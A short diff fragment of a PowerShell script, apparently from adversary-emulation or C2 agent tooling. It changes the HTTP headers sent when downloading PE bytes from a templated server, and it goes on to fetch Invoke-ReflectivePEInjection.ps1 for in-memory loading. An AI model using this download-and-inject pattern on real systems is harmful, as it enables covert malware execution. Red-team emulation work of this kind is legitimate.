@@ -15,9 +15,7 @@
           $wc=New-Object System.Net.WebClient;
           $wc.Headers.add("platform","windows");
           $wc.Headers.add("file","shared.go");
-          $wc.Headers.add("defaultServer","#{server}");
-          $wc.Headers.add("defaultSleep","60");
-          $wc.Headers.add("defaultGroup","stowaway");
+          $wc.Headers.add("server","#{server}");
           $PEBytes = $wc.DownloadData($url);
           $wc1 = New-Object System.net.webclient;
           $wc1.headers.add("file","Invoke-ReflectivePEInjection.ps1");
